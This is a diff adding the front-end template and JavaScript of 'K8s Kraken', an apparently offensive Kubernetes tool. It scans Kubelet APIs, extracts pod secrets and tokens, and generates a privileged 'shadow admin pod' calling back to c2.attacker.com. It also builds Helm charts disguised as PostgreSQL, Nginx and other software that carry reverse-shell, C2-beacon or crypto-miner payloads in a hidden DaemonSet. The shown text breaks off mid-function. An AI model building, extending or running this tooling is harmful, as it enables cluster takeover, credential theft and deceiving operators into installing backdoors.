@@ -1,0 +1,861 @@
+{% extends "base.html" %}
+{% block title %}K8s Kraken - Kubernetes Warfare{% endblock %}
+{% block content %}
+<div class="min-h-screen p-6">
+    <!-- Header -->
+    <div class="glass rounded-2xl p-8 mb-8 text-center border border-cyan-500/30">
+        <h1 class="text-4xl font-bold bg-gradient-to-r from-cyan-400 to-blue-500 bg-clip-text text-transparent mb-2">
+            <i class="fas fa-dharmachakra mr-3"></i>K8s Kraken
+        </h1>
+        <p class="text-xl text-gray-300 mb-1">Container & Orchestration Warfare</p>
+        <p class="text-sm text-gray-500">Kubernetes Cluster Domination • Helm Backdoor • DaemonSet Persistence</p>
+    </div>
+
+    <!-- Status Bar -->
+    <div class="grid grid-cols-1 md:grid-cols-4 gap-4 mb-8">
+        <div class="glass rounded-xl p-4 text-center border border-green-500/30">
+            <div class="text-green-400 font-bold mb-1">
+                <i class="fas fa-check-circle mr-1"></i> Module Active
+            </div>
+            <div class="text-gray-400 text-sm" id="moduleStatus">Checking...</div>
+        </div>
+        <div class="glass rounded-xl p-4 text-center border border-yellow-500/30">
+            <div class="text-yellow-400 font-bold mb-1">
+                <i class="fas fa-network-wired mr-1"></i> Kubelet Port
+            </div>
+            <div class="text-gray-300 text-sm">TCP 10250</div>
+        </div>
+        <div class="glass rounded-xl p-4 text-center border border-red-500/30">
+            <div class="text-red-400 font-bold mb-1">
+                <i class="fas fa-database mr-1"></i> ETCD
+            </div>
+            <div class="text-gray-300 text-sm">TCP 2379</div>
+        </div>
+        <div class="glass rounded-xl p-4 text-center border border-cyan-500/30">
+            <div class="text-cyan-400 font-bold mb-1">
+                <i class="fas fa-box mr-1"></i> Helm Charts
+            </div>
+            <div class="text-gray-300 text-sm" id="chartCount">8 Templates</div>
+        </div>
+    </div>
+
+    <!-- Tab Navigation -->
+    <div class="flex flex-wrap gap-2 mb-6">
+        <button onclick="switchTab('kubelet')" id="tab-kubelet" class="tab-btn active px-6 py-3 rounded-lg font-medium transition-all bg-yellow-500/20 text-yellow-400 border border-yellow-500/50">
+            <i class="fas fa-unlock-alt mr-2"></i>Kubelet Exploiter
+        </button>
+        <button onclick="switchTab('helm')" id="tab-helm" class="tab-btn px-6 py-3 rounded-lg font-medium transition-all bg-white/5 text-gray-400 border border-white/10 hover:bg-cyan-500/20 hover:text-cyan-400">
+            <i class="fas fa-file-archive mr-2"></i>Helm Backdoor Generator
+        </button>
+        <button onclick="switchTab('playbook')" id="tab-playbook" class="tab-btn px-6 py-3 rounded-lg font-medium transition-all bg-white/5 text-gray-400 border border-white/10 hover:bg-green-500/20 hover:text-green-400">
+            <i class="fas fa-book mr-2"></i>Attack Playbook
+        </button>
+    </div>
+
+    <!-- KUBELET EXPLOITER TAB -->
+    <div id="content-kubelet" class="tab-content">
+        <div class="grid grid-cols-1 lg:grid-cols-5 gap-6">
+            <!-- Left Column - Forms -->
+            <div class="lg:col-span-2 space-y-6">
+                <!-- Kubelet Scanner -->
+                <div class="glass rounded-xl overflow-hidden border border-yellow-500/30">
+                    <div class="bg-gradient-to-r from-yellow-500/20 to-orange-500/20 px-4 py-3 border-b border-yellow-500/30">
+                        <h3 class="text-yellow-400 font-bold">
+                            <i class="fas fa-radar mr-2"></i>Kubelet API Scanner
+                        </h3>
+                    </div>
+                    <div class="p-4 space-y-4">
+                        <div>
+                            <label class="block text-gray-300 text-sm mb-1">Target IP(s)</label>
+                            <input type="text" id="kubeletTarget" placeholder="10.0.0.1 or 10.0.0.1,10.0.0.2,10.0.0.3"
+                                   class="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-white placeholder-gray-500 focus:border-yellow-500/50 focus:outline-none">
+                            <p class="text-gray-500 text-xs mt-1">Single IP or comma-separated list</p>
+                        </div>
+                        <div class="grid grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-gray-300 text-sm mb-1">Port</label>
+                                <input type="number" id="kubeletPort" value="10250"
+                                       class="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-white focus:border-yellow-500/50 focus:outline-none">
+                            </div>
+                            <div>
+                                <label class="block text-gray-300 text-sm mb-1">Timeout (sec)</label>
+                                <input type="number" id="kubeletTimeout" value="10"
+                                       class="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-white focus:border-yellow-500/50 focus:outline-none">
+                            </div>
+                        </div>
+                        <button onclick="scanKubelet()" class="w-full bg-gradient-to-r from-yellow-500 to-orange-500 text-black font-bold py-2 px-4 rounded-lg hover:opacity-90 transition-opacity">
+                            <i class="fas fa-search mr-2"></i>Scan Kubelet API
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Shadow Pod Generator -->
+                <div class="glass rounded-xl overflow-hidden border border-red-500/30">
+                    <div class="bg-gradient-to-r from-red-500/20 to-pink-500/20 px-4 py-3 border-b border-red-500/30">
+                        <h3 class="text-red-400 font-bold">
+                            <i class="fas fa-user-secret mr-2"></i>Shadow Admin Pod
+                        </h3>
+                    </div>
+                    <div class="p-4 space-y-4">
+                        <div>
+                            <label class="block text-gray-300 text-sm mb-1">Pod Name</label>
+                            <input type="text" id="shadowPodName" value="metrics-helper" placeholder="coredns-helper"
+                                   class="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-white focus:border-red-500/50 focus:outline-none">
+                        </div>
+                        <div>
+                            <label class="block text-gray-300 text-sm mb-1">Namespace</label>
+                            <input type="text" id="shadowNamespace" value="kube-system"
+                                   class="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-white focus:border-red-500/50 focus:outline-none">
+                        </div>
+                        <div>
+                            <label class="block text-gray-300 text-sm mb-1">Callback URL</label>
+                            <input type="text" id="shadowCallback" placeholder="http://c2.attacker.com:4444"
+                                   class="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-white focus:border-red-500/50 focus:outline-none">
+                        </div>
+                        <div class="flex flex-wrap gap-4">
+                            <label class="flex items-center gap-2 text-gray-300 text-sm cursor-pointer">
+                                <input type="checkbox" id="shadowPrivileged" checked class="w-4 h-4 rounded border-gray-600 bg-black/30 text-red-500 focus:ring-red-500/50">
+                                Privileged
+                            </label>
+                            <label class="flex items-center gap-2 text-gray-300 text-sm cursor-pointer">
+                                <input type="checkbox" id="shadowHostNetwork" checked class="w-4 h-4 rounded border-gray-600 bg-black/30 text-red-500 focus:ring-red-500/50">
+                                hostNetwork
+                            </label>
+                            <label class="flex items-center gap-2 text-gray-300 text-sm cursor-pointer">
+                                <input type="checkbox" id="shadowHostPid" checked class="w-4 h-4 rounded border-gray-600 bg-black/30 text-red-500 focus:ring-red-500/50">
+                                hostPID
+                            </label>
+                        </div>
+                        <button onclick="generateShadowPod()" class="w-full bg-gradient-to-r from-red-500 to-pink-500 text-white font-bold py-2 px-4 rounded-lg hover:opacity-90 transition-opacity">
+                            <i class="fas fa-download mr-2"></i>Generate Shadow Pod YAML
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Right Column - Results -->
+            <div class="lg:col-span-3">
+                <div class="glass rounded-xl overflow-hidden border border-gray-500/30 h-full">
+                    <div class="bg-gradient-to-r from-gray-500/20 to-gray-600/20 px-4 py-3 border-b border-gray-500/30 flex justify-between items-center">
+                        <h3 class="text-gray-300 font-bold">
+                            <i class="fas fa-terminal mr-2"></i>Scan Results
+                        </h3>
+                        <button onclick="clearKubeletResults()" class="text-gray-400 hover:text-white text-sm">
+                            <i class="fas fa-trash mr-1"></i>Clear
+                        </button>
+                    </div>
+                    <div class="p-4 min-h-[500px] max-h-[600px] overflow-y-auto" id="kubeletResults">
+                        <div class="flex flex-col items-center justify-center h-64 text-gray-500">
+                            <i class="fas fa-dharmachakra text-6xl mb-4 opacity-30"></i>
+                            <p>Enter target IP and scan for exposed Kubelet APIs</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- HELM BACKDOOR TAB -->
+    <div id="content-helm" class="tab-content hidden">
+        <div class="grid grid-cols-1 lg:grid-cols-5 gap-6">
+            <!-- Left Column - Generator -->
+            <div class="lg:col-span-2 space-y-6">
+                <!-- Chart Generator -->
+                <div class="glass rounded-xl overflow-hidden border border-cyan-500/30">
+                    <div class="bg-gradient-to-r from-cyan-500/20 to-blue-500/20 px-4 py-3 border-b border-cyan-500/30">
+                        <h3 class="text-cyan-400 font-bold">
+                            <i class="fas fa-file-code mr-2"></i>Backdoor Chart Generator
+                        </h3>
+                    </div>
+                    <div class="p-4 space-y-4">
+                        <div>
+                            <label class="block text-gray-300 text-sm mb-1">Chart Type (Disguise)</label>
+                            <select id="helmChartType" class="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-white focus:border-cyan-500/50 focus:outline-none">
+                                <option value="postgresql">PostgreSQL - Database</option>
+                                <option value="mysql">MySQL - Database</option>
+                                <option value="redis">Redis - Cache</option>
+                                <option value="mongodb">MongoDB - NoSQL</option>
+                                <option value="nginx" selected>Nginx - Web Server</option>
+                                <option value="prometheus">Prometheus - Monitoring</option>
+                                <option value="grafana">Grafana - Dashboards</option>
+                                <option value="elasticsearch">Elasticsearch - Search</option>
+                            </select>
+                            <p class="text-gray-500 text-xs mt-1">DevOps will think they're installing this</p>
+                        </div>
+                        <div>
+                            <label class="block text-gray-300 text-sm mb-1">Payload Type</label>
+                            <select id="helmPayloadType" class="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-white focus:border-cyan-500/50 focus:outline-none">
+                                <option value="reverse_shell">Reverse Shell</option>
+                                <option value="beacon" selected>Beacon (C2)</option>
+                                <option value="miner">Crypto Miner</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label class="block text-gray-300 text-sm mb-1">Callback URL</label>
+                            <input type="text" id="helmCallback" placeholder="http://c2.attacker.com:4444"
+                                   class="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-white focus:border-cyan-500/50 focus:outline-none">
+                        </div>
+                        <div>
+                            <label class="block text-gray-300 text-sm mb-1">Chart Version</label>
+                            <input type="text" id="helmVersion" value="1.0.0"
+                                   class="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-white focus:border-cyan-500/50 focus:outline-none">
+                        </div>
+                        <label class="flex items-center gap-2 text-gray-300 text-sm cursor-pointer">
+                            <input type="checkbox" id="helmDaemonset" checked class="w-4 h-4 rounded border-gray-600 bg-black/30 text-cyan-500 focus:ring-cyan-500/50">
+                            Include DaemonSet <span class="px-2 py-0.5 bg-red-500/20 text-red-400 text-xs rounded ml-2">Runs on ALL nodes</span>
+                        </label>
+                        <div class="space-y-2">
+                            <button onclick="generateHelmChart()" class="w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold py-2 px-4 rounded-lg hover:opacity-90 transition-opacity">
+                                <i class="fas fa-code mr-2"></i>Generate Chart
+                            </button>
+                            <button onclick="downloadHelmChart()" id="helmDownloadBtn" disabled class="w-full bg-gradient-to-r from-green-500 to-emerald-500 text-white font-bold py-2 px-4 rounded-lg hover:opacity-90 transition-opacity disabled:opacity-50 disabled:cursor-not-allowed">
+                                <i class="fas fa-download mr-2"></i>Download as ZIP
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- How It Works -->
+                <div class="glass rounded-xl overflow-hidden border border-yellow-500/30">
+                    <div class="bg-gradient-to-r from-yellow-500/20 to-amber-500/20 px-4 py-3 border-b border-yellow-500/30">
+                        <h3 class="text-yellow-400 font-bold">
+                            <i class="fas fa-info-circle mr-2"></i>How It Works
+                        </h3>
+                    </div>
+                    <div class="p-4">
+                        <ol class="list-decimal list-inside text-gray-300 space-y-2 text-sm">
+                            <li>Generate chart disguised as legit software</li>
+                            <li>Hidden DaemonSet named <code class="text-cyan-400 bg-black/30 px-1 rounded">metrics-collector</code></li>
+                            <li>Payload encoded in <code class="text-cyan-400 bg-black/30 px-1 rounded">telemetry</code> ConfigMap</li>
+                            <li>DevOps runs: <code class="text-yellow-400 bg-black/30 px-1 rounded">helm install mydb ./chart</code></li>
+                            <li>Your agent deploys to <strong class="text-red-400">EVERY</strong> node 🎯</li>
+                        </ol>
+                        <div class="mt-4 p-3 bg-red-500/10 border border-red-500/30 rounded-lg">
+                            <p class="text-red-400 text-sm">
+                                <i class="fas fa-exclamation-triangle mr-2"></i>
+                                <strong>Persistence:</strong> DaemonSet respawns automatically!
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Right Column - Preview -->
+            <div class="lg:col-span-3">
+                <div class="glass rounded-xl overflow-hidden border border-gray-500/30 h-full">
+                    <div class="bg-gradient-to-r from-gray-500/20 to-gray-600/20 px-4 py-3 border-b border-gray-500/30">
+                        <h3 class="text-gray-300 font-bold">
+                            <i class="fas fa-file-alt mr-2"></i>Generated Chart Preview
+                        </h3>
+                    </div>
+                    <div class="p-4" id="helmResults">
+                        <div class="flex flex-col items-center justify-center h-64 text-gray-500">
+                            <i class="fas fa-box text-6xl mb-4 opacity-30"></i>
+                            <p>Configure options and generate a backdoored Helm chart</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ATTACK PLAYBOOK TAB -->
+    <div id="content-playbook" class="tab-content hidden">
+        <div class="glass rounded-xl overflow-hidden border border-green-500/30">
+            <div class="bg-gradient-to-r from-green-500/20 to-emerald-500/20 px-4 py-3 border-b border-green-500/30">
+                <h3 class="text-green-400 font-bold">
+                    <i class="fas fa-book mr-2"></i>Kubernetes Cluster Takeover Playbook
+                </h3>
+            </div>
+            <div class="p-6" id="playbookContent">
+                <div class="flex justify-center py-8">
+                    <div class="animate-spin w-8 h-8 border-4 border-green-500 border-t-transparent rounded-full"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Shadow Pod YAML Modal -->
+<div id="shadowPodModal" class="fixed inset-0 bg-black/80 hidden items-center justify-center z-50 p-4">
+    <div class="glass rounded-xl max-w-3xl w-full max-h-[90vh] overflow-hidden border border-red-500/30">
+        <div class="bg-gradient-to-r from-red-500/20 to-pink-500/20 px-4 py-3 border-b border-red-500/30 flex justify-between items-center">
+            <h3 class="text-red-400 font-bold">
+                <i class="fas fa-user-secret mr-2"></i>Shadow Admin Pod YAML
+            </h3>
+            <button onclick="closeShadowModal()" class="text-gray-400 hover:text-white">
+                <i class="fas fa-times text-xl"></i>
+            </button>
+        </div>
+        <div class="p-4">
+            <pre id="shadowPodYaml" class="bg-black/50 text-green-400 p-4 rounded-lg overflow-auto max-h-[400px] text-sm font-mono"></pre>
+            <div class="mt-4 p-3 bg-black/30 rounded-lg">
+                <span class="text-gray-400">Deploy Command:</span>
+                <code class="text-yellow-400 ml-2">kubectl apply -f shadow-pod.yaml</code>
+            </div>
+        </div>
+        <div class="px-4 py-3 border-t border-red-500/30 flex justify-end gap-3">
+            <button onclick="closeShadowModal()" class="px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-500 transition-colors">
+                Close
+            </button>
+            <button onclick="copyShadowPod()" class="px-4 py-2 bg-red-500 text-white rounded-lg hover:bg-red-400 transition-colors">
+                <i class="fas fa-copy mr-2"></i>Copy YAML
+            </button>
+            <button onclick="downloadShadowPod()" class="px-4 py-2 bg-yellow-500 text-black rounded-lg hover:bg-yellow-400 transition-colors">
+                <i class="fas fa-download mr-2"></i>Download
+            </button>
+        </div>
+    </div>
+</div>
+
+<style>
+.tab-btn.active {
+    background: linear-gradient(135deg, rgba(234, 179, 8, 0.2), rgba(249, 115, 22, 0.2));
+    color: #fbbf24;
+    border-color: rgba(234, 179, 8, 0.5);
+}
+.file-tree-item {
+    cursor: pointer;
+    padding: 8px 12px;
+    border-radius: 6px;
+    transition: all 0.2s;
+}
+.file-tree-item:hover {
+    background: rgba(255, 255, 255, 0.1);
+}
+.file-tree-item.active {
+    background: rgba(6, 182, 212, 0.2);
+    border-left: 3px solid #06b6d4;
+}
+.result-card {
+    background: rgba(0, 0, 0, 0.3);
+    border-radius: 8px;
+    padding: 16px;
+    margin-bottom: 12px;
+}
+.result-card.exploitable {
+    border-left: 4px solid #22c55e;
+}
+.result-card.not-exploitable {
+    border-left: 4px solid #ef4444;
+}
+.playbook-phase {
+    background: rgba(0, 0, 0, 0.3);
+    border-radius: 12px;
+    padding: 20px;
+    margin-bottom: 16px;
+}
+</style>
+
+<script>
+let currentHelmChart = null;
+
+document.addEventListener('DOMContentLoaded', function() {
+    checkModuleStatus();
+    loadPlaybook();
+});
+
+// Tab switching
+function switchTab(tabName) {
+    // Hide all content
+    document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
+    
+    // Show selected content
+    document.getElementById('content-' + tabName).classList.remove('hidden');
+    
+    // Update tab buttons
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.classList.remove('active');
+        btn.classList.remove('bg-yellow-500/20', 'text-yellow-400', 'border-yellow-500/50');
+        btn.classList.remove('bg-cyan-500/20', 'text-cyan-400', 'border-cyan-500/50');
+        btn.classList.remove('bg-green-500/20', 'text-green-400', 'border-green-500/50');
+        btn.classList.add('bg-white/5', 'text-gray-400', 'border-white/10');
+    });
+    
+    const activeBtn = document.getElementById('tab-' + tabName);
+    activeBtn.classList.add('active');
+    activeBtn.classList.remove('bg-white/5', 'text-gray-400', 'border-white/10');
+    
+    if (tabName === 'kubelet') {
+        activeBtn.classList.add('bg-yellow-500/20', 'text-yellow-400', 'border-yellow-500/50');
+    } else if (tabName === 'helm') {
+        activeBtn.classList.add('bg-cyan-500/20', 'text-cyan-400', 'border-cyan-500/50');
+    } else if (tabName === 'playbook') {
+        activeBtn.classList.add('bg-green-500/20', 'text-green-400', 'border-green-500/50');
+    }
+}
+
+// Check module status
+async function checkModuleStatus() {
+    try {
+        const response = await fetch('/k8s-kraken/api/status');
+        const data = await response.json();
+        
+        document.getElementById('moduleStatus').textContent = 
+            data.available ? 'v' + data.version : 'Not Available';
+        document.getElementById('chartCount').textContent = 
+            (data.supported_charts?.length || 8) + ' Templates';
+    } catch (error) {
+        document.getElementById('moduleStatus').textContent = 'Error';
+    }
+}
+
+// Kubelet Scan
+async function scanKubelet() {
+    const targetInput = document.getElementById('kubeletTarget').value;
+    const port = parseInt(document.getElementById('kubeletPort').value);
+    const timeout = parseInt(document.getElementById('kubeletTimeout').value);
+    
+    if (!targetInput) {
+        alert('Please enter a target IP');
+        return;
+    }
+    
+    const resultsDiv = document.getElementById('kubeletResults');
+    resultsDiv.innerHTML = `
+        <div class="flex flex-col items-center justify-center h-32">
+            <div class="animate-spin w-8 h-8 border-4 border-yellow-500 border-t-transparent rounded-full mb-3"></div>
+            <p class="text-gray-400">Scanning...</p>
+        </div>
+    `;
+    
+    const targets = targetInput.split(',').map(t => t.trim()).filter(t => t);
+    
+    try {
+        let response;
+        if (targets.length > 1) {
+            response = await fetch('/k8s-kraken/api/scan-range', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ targets, port })
+            });
+        } else {
+            response = await fetch('/k8s-kraken/api/kubelet/scan', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ target: targets[0], port, timeout })
+            });
+        }
+        
+        const data = await response.json();
+        
+        if (targets.length > 1) {
+            displayMultiScanResults(data);
+        } else {
+            displaySingleScanResult(data);
+        }
+    } catch (error) {
+        resultsDiv.innerHTML = `<div class="p-4 bg-red-500/20 border border-red-500/50 rounded-lg text-red-400">${error.message}</div>`;
+    }
+}
+
+function displaySingleScanResult(data) {
+    const resultsDiv = document.getElementById('kubeletResults');
+    
+    if (!data.success) {
+        resultsDiv.innerHTML = `<div class="p-4 bg-red-500/20 border border-red-500/50 rounded-lg text-red-400">${data.error}</div>`;
+        return;
+    }
+    
+    const result = data.result;
+    const isExploitable = result.exploitable;
+    
+    let html = `
+        <div class="result-card ${isExploitable ? 'exploitable' : 'not-exploitable'}">
+            <div class="flex justify-between items-center mb-4">
+                <h4 class="text-lg font-bold text-white">${result.target}:${result.port}</h4>
+                <span class="px-3 py-1 rounded-full text-sm font-bold ${isExploitable ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}">
+                    ${isExploitable ? '✓ EXPLOITABLE' : '✗ Not Exploitable'}
+                </span>
+            </div>
+            
+            <div class="grid grid-cols-2 gap-2 text-sm">
+                <div class="text-gray-400">Auth Status</div>
+                <div class="text-cyan-400 font-mono">${result.auth_status}</div>
+                <div class="text-gray-400">K8s Version</div>
+                <div class="text-white">${result.version || 'Unknown'}</div>
+                <div class="text-gray-400">Pods Count</div>
+                <div class="text-white">${result.pods_count}</div>
+                <div class="text-gray-400">Namespaces</div>
+                <div class="text-white">${result.namespaces?.join(', ') || 'N/A'}</div>
+                <div class="text-gray-400">Secrets Accessible</div>
+                <div class="${result.secrets_accessible ? 'text-green-400' : 'text-gray-500'}">${result.secrets_accessible ? 'YES' : 'No'}</div>
+            </div>
+    `;
+    
+    if (isExploitable) {
+        html += `
+            <div class="mt-4 flex flex-wrap gap-2">
+                <button onclick="listPods('${result.target}', ${result.port})" class="px-3 py-1 bg-yellow-500/20 text-yellow-400 border border-yellow-500/50 rounded-lg text-sm hover:bg-yellow-500/30 transition-colors">
+                    <i class="fas fa-list mr-1"></i>List Pods
+                </button>
+                <button onclick="extractSecrets('${result.target}', ${result.port})" class="px-3 py-1 bg-red-500/20 text-red-400 border border-red-500/50 rounded-lg text-sm hover:bg-red-500/30 transition-colors">
+                    <i class="fas fa-key mr-1"></i>Extract Secrets
+                </button>
+            </div>
+        `;
+    }
+    
+    html += '</div>';
+    resultsDiv.innerHTML = html;
+}
+
+function displayMultiScanResults(data) {
+    const resultsDiv = document.getElementById('kubeletResults');
+    
+    if (!data.success) {
+        resultsDiv.innerHTML = `<div class="p-4 bg-red-500/20 border border-red-500/50 rounded-lg text-red-400">${data.error}</div>`;
+        return;
+    }
+    
+    let html = `
+        <div class="p-3 bg-cyan-500/20 border border-cyan-500/50 rounded-lg mb-4">
+            <strong class="text-cyan-400">Scan Summary:</strong>
+            <span class="text-white ml-2">${data.summary.exploitable}/${data.summary.total_scanned} exploitable</span>
+        </div>
+    `;
+    
+    data.results.forEach(result => {
+        html += `
+            <div class="result-card ${result.exploitable ? 'exploitable' : 'not-exploitable'}">
+                <div class="flex justify-between items-center">
+                    <code class="text-white">${result.target}:${result.port}</code>
+                    <span class="px-2 py-0.5 rounded text-xs ${result.exploitable ? 'bg-green-500/20 text-green-400' : 'bg-gray-500/20 text-gray-400'}">
+                        ${result.auth_status}
+                    </span>
+                </div>
+            </div>
+        `;
+    });
+    
+    resultsDiv.innerHTML = html;
+}
+
+async function listPods(target, port) {
+    const resultsDiv = document.getElementById('kubeletResults');
+    resultsDiv.innerHTML += `
+        <div class="flex items-center justify-center py-4 text-gray-400">
+            <div class="animate-spin w-5 h-5 border-2 border-yellow-500 border-t-transparent rounded-full mr-3"></div>
+            Listing pods...
+        </div>
+    `;
+    
+    try {
+        const response = await fetch('/k8s-kraken/api/kubelet/pods', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ target, port })
+        });
+        const data = await response.json();
+        
+        if (data.success) {
+            let html = `
+                <div class="result-card mt-4">
+                    <h4 class="text-yellow-400 font-bold mb-3"><i class="fas fa-box mr-2"></i>Pods (${data.summary.total})</h4>
+                    <div class="overflow-x-auto">
+                        <table class="w-full text-sm">
+                            <thead>
+                                <tr class="text-gray-400 text-left">
+                                    <th class="pb-2">Namespace</th>
+                                    <th class="pb-2">Pod</th>
+                                    <th class="pb-2">Status</th>
+                                    <th class="pb-2">Flags</th>
+                                </tr>
+                            </thead>
+                            <tbody class="text-gray-300">
+            `;
+            data.pods.slice(0, 20).forEach(pod => {
+                let flags = [];
+                if (pod.privileged) flags.push('<span class="px-1 bg-red-500/30 text-red-400 text-xs rounded">Priv</span>');
+                if (pod.host_network) flags.push('<span class="px-1 bg-yellow-500/30 text-yellow-400 text-xs rounded">HostNet</span>');
+                
+                html += `
+                    <tr class="border-t border-white/5">
+                        <td class="py-2">${pod.namespace}</td>
+                        <td class="py-2 font-mono text-cyan-400">${pod.name}</td>
+                        <td class="py-2">${pod.status || 'Running'}</td>
+                        <td class="py-2">${flags.join(' ') || '-'}</td>
+                    </tr>
+                `;
+            });
+            html += '</tbody></table></div></div>';
+            resultsDiv.innerHTML += html;
+        }
+    } catch (error) {
+        console.error(error);
+    }
+}
+
+async function extractSecrets(target, port) {
+    const resultsDiv = document.getElementById('kubeletResults');
+    resultsDiv.innerHTML += `
+        <div class="flex items-center justify-center py-4 text-gray-400">
+            <div class="animate-spin w-5 h-5 border-2 border-red-500 border-t-transparent rounded-full mr-3"></div>
+            Extracting secrets...
+        </div>
+    `;
+    
+    try {
+        const response = await fetch('/k8s-kraken/api/kubelet/secrets', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ target, port })
+        });
+        const data = await response.json();
+        
+        if (data.success) {
+            let html = `
+                <div class="result-card mt-4">
+                    <h4 class="text-red-400 font-bold mb-3"><i class="fas fa-key mr-2"></i>Secrets Found (${data.summary.total})</h4>
+                    <div class="p-2 bg-green-500/20 border border-green-500/30 rounded mb-3 text-sm">
+                        SA Tokens: <span class="text-green-400 font-bold">${data.summary.service_account_tokens}</span> |
+                        Env Vars: <span class="text-green-400 font-bold">${data.summary.env_variables}</span>
+                    </div>
+                    <div class="max-h-[300px] overflow-y-auto space-y-2">
+            `;
+            data.secrets.slice(0, 10).forEach(secret => {
+                html += `
+                    <div class="p-3 bg-black/50 rounded">
+                        <div class="text-gray-500 text-xs mb-1">${secret.pod} / ${secret.type}</div>
+                        <code class="text-green-400 text-sm break-all">${secret.value?.substring(0, 100)}...</code>
+                    </div>
+                `;
+            });
+            html += '</div></div>';
+            resultsDiv.innerHTML += html;
+        }
+    } catch (error) {
+        console.error(error);
+    }
+}
+
+function clearKubeletResults() {
+    document.getElementById('kubeletResults').innerHTML = `
+        <div class="flex flex-col items-center justify-center h-64 text-gray-500">
+            <i class="fas fa-dharmachakra text-6xl mb-4 opacity-30"></i>
+            <p>Enter target IP and scan for exposed Kubelet APIs</p>
+        </div>
+    `;
+}
+
+// Shadow Pod Generator
+async function generateShadowPod() {
+    try {
+        const response = await fetch('/k8s-kraken/api/kubelet/shadow-pod', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                name: document.getElementById('shadowPodName').value,
+                namespace: document.getElementById('shadowNamespace').value,
+                callback_url: document.getElementById('shadowCallback').value,
+                privileged: document.getElementById('shadowPrivileged').checked,
+                host_network: document.getElementById('shadowHostNetwork').checked,
+                host_pid: document.getElementById('shadowHostPid').checked
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+            document.getElementById('shadowPodYaml').textContent = data.yaml;
+            document.getElementById('shadowPodModal').classList.remove('hidden');
+            document.getElementById('shadowPodModal').classList.add('flex');
+        }
+    } catch (error) {
+        alert('Error: ' + error.message);
+    }
+}
+
+function closeShadowModal() {
+    document.getElementById('shadowPodModal').classList.add('hidden');
+    document.getElementById('shadowPodModal').classList.remove('flex');
+}
+
+function copyShadowPod() {
+    const yaml = document.getElementById('shadowPodYaml').textContent;
+    navigator.clipboard.writeText(yaml);
+    alert('YAML copied to clipboard!');
+}
+
+function downloadShadowPod() {
+    const yaml = document.getElementById('shadowPodYaml').textContent;
+    const blob = new Blob([yaml], { type: 'text/yaml' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'shadow-pod.yaml';
+    a.click();
+}
+
+// Helm Chart Generator
+async function generateHelmChart() {
+    const resultsDiv = document.getElementById('helmResults');
+    resultsDiv.innerHTML = `
+        <div class="flex flex-col items-center justify-center h-32">
+            <div class="animate-spin w-8 h-8 border-4 border-cyan-500 border-t-transparent rounded-full mb-3"></div>
+            <p class="text-gray-400">Generating chart...</p>
+        </div>
+    `;
+    
+    try {
+        const response = await fetch('/k8s-kraken/api/helm/generate', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chart_type: document.getElementById('helmChartType').value,
+                payload_type: document.getElementById('helmPayloadType').value,
+                callback_url: document.getElementById('helmCallback').value,
+                version: document.getElementById('helmVersion').value,
+                include_daemonset: document.getElementById('helmDaemonset').checked
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+            currentHelmChart = data.chart;
+            displayHelmChart(data);
+            document.getElementById('helmDownloadBtn').disabled = false;
+        } else {
+            resultsDiv.innerHTML = `<div class="p-4 bg-red-500/20 border border-red-500/50 rounded-lg text-red-400">${data.error}</div>`;
+        }
+    } catch (error) {
+        resultsDiv.innerHTML = `<div class="p-4 bg-red-500/20 border border-red-500/50 rounded-lg text-red-400">${error.message}</div>`;
+    }
+}
+
+function displayHelmChart(data) {
+    const chart = data.chart;
+    const files = Object.keys(chart.files);
+    
+    let html = `
+        <div class="mb-4">
+            <div class="flex justify-between items-start">
+                <div>
+                    <h4 class="text-cyan-400 font-bold text-lg">${chart.name}</h4>
+                    <p class="text-gray-500 text-sm">${chart.description}</p>
+                </div>
+                <span class="px-2 py-1 bg-cyan-500/20 text-cyan-400 text-sm rounded">v${chart.version}</span>
+            </div>
+        </div>
+        
+        <div class="p-3 bg-yellow-500/20 border border-yellow-500/30 rounded-lg mb-4">
+            <span class="text-yellow-400 font-bold">Install:</span>
+            <code class="text-white ml-2">${data.install_command}</code>
+        </div>
+        
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+            <div>
+                <h5 class="text-gray-300 font-bold mb-2">Chart Files</h5>
+                <div class="space-y-1">
+    `;
+    
+    files.forEach((file, index) => {
+        const icon = file.endsWith('.yaml') ? 'file-code' : 'file-alt';
+        html += `
